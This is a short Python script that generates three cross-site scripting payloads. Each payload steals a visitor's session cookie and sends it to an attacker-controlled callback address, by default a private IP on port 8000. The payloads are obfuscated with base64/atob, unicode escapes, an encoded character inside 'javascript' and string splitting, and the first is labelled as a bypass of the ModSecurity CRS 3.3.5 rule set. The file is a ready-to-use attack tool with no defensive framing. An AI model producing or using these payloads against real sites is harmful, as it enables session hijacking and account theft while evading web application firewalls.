#!/usr/bin/env python3
"""Quick payload generator for copy-paste."""
import base64, sys

cb = sys.argv[1] if len(sys.argv) > 1 else "http://10.80.97.140:8000"

js = f"new Image().src='{cb}?c='+document.cookie"
b64 = base64.b64encode(js.encode()).decode()

p1 = f'<a href=ja&#x0D;vascript&colon;\\u0065val(\\u0061tob("{b64}"))>click</a>'
print("=== Payload 1: CRS 3.3.5 bypass (a-href + eval/atob + unicode) ===")
print(f"Length: {len(p1)} chars")
print(p1)
print()

p2 = f"""<body onload="new Image().src='{cb}?c='+document['coo'+'kie'];">"""
print("=== Payload 2: body onload + string concat ===")
print(f"Length: {len(p2)} chars")
print(p2)
print()

js2 = f"fetch('{cb}?c='+document.cookie)"
b64_2 = base64.b64encode(js2.encode()).decode()
p3 = f'<svg onload=eval(atob("{b64_2}"))>'
print("=== Payload 3: svg onload + atob ===")
print(f"Length: {len(p3)} chars")
print(p3)
